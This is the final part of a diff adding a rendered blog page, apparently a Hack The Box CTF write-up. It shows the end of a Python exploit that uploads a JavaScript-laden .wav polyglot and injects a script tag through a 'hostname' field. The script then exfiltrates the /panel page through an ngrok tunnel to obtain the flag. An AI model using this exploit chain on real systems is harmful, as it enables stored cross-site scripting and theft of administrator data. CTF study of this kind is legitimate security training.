+    <span class="n">agent_creds</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+
+    <span class="c1"># create public tunnel
+</span>    <span class="n">http_tunnel</span> <span class="o">=</span> <span class="n">ngrok</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">LOCAL_SERVER_PORT</span><span class="p">,</span> <span class="s">'http'</span><span class="p">)</span>
+
+    <span class="c1"># create craftet .wav file
+</span>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"test.wav"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">get_js_script</span><span class="p">(</span><span class="n">http_tunnel</span><span class="p">.</span><span class="n">public_url</span><span class="p">).</span><span class="n">encode</span><span class="p">())</span>
+
+    <span class="c1"># upload the crafted .wav file
+</span>    <span class="nb">file</span> <span class="o">=</span> <span class="p">{</span><span class="s">"recording"</span><span class="p">:</span> <span class="p">(</span><span class="s">'test.wav'</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="s">"test.wav"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">),</span> <span class="s">"audio/wave"</span><span class="p">)}</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ADDRESS</span><span class="si">}</span><span class="s">/agents/upload/</span><span class="si">{</span><span class="n">agent_creds</span><span class="p">[</span><span class="s">'identifier'</span><span class="p">]</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">agent_creds</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="nb">file</span><span class="p">)</span>
+
+    <span class="c1"># inject script tag
+</span>    <span class="n">remote_file_path</span> <span class="o">=</span> <span class="s">'/uploads/'</span> <span class="o">+</span> <span class="n">resp</span><span class="p">.</span><span class="n">text</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">"http://</span><span class="si">{</span><span class="n">ADDRESS</span><span class="si">}</span><span class="s">/agents/details/</span><span class="si">{</span><span class="n">agent_creds</span><span class="p">[</span><span class="s">'identifier'</span><span class="p">]</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">agent_creds</span><span class="p">[</span><span class="s">'token'</span><span class="p">]</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"hostname"</span><span class="p">:</span> <span class="sa">f</span><span class="s">'&lt;script src="</span><span class="si">{</span><span class="n">remote_file_path</span><span class="si">}</span><span class="s">"&gt;&lt;/script&gt;'</span><span class="p">,</span>
+            <span class="s">"platform"</span><span class="p">:</span> <span class="s">"test"</span><span class="p">,</span>
+            <span class="s">"arch"</span><span class="p">:</span> <span class="s">"test"</span> 
+        <span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"application/json"</span>
+        <span class="p">})</span>
+
+    <span class="c1"># steal /panel content
+</span>    <span class="n">panel_page</span> <span class="o">=</span> <span class="n">steal_page</span><span class="p">()</span>
+
+    <span class="n">ngrok</span><span class="p">.</span><span class="n">disconnect</span><span class="p">(</span><span class="n">http_tunnel</span><span class="p">.</span><span class="n">public_url</span><span class="p">)</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="n">panel_page</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'HTB{'</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">flag</span> <span class="o">=</span> <span class="s">"HTB{"</span> <span class="o">+</span> <span class="n">flag</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'}'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">'}'</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>Finally, if we execute it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod</span> +x exploit.py
+<span class="nv">$ </span>./exploit.py
+HTB<span class="o">{</span>p01yg10t5_4nd_35p10n4g3<span class="o">}</span>
+</code></pre></div></div>
+
+</div>
+        </div>
+        <footer class="about">
+    <div class="about__devider">*****</div>
+    <div class="about__text">
+        🛠️ Powered by Jekyll 🛠️
+        <br> 📖 Hosted on GitHub Pages 📖
+    </div>
+</footer>
+    </body>
+</html>
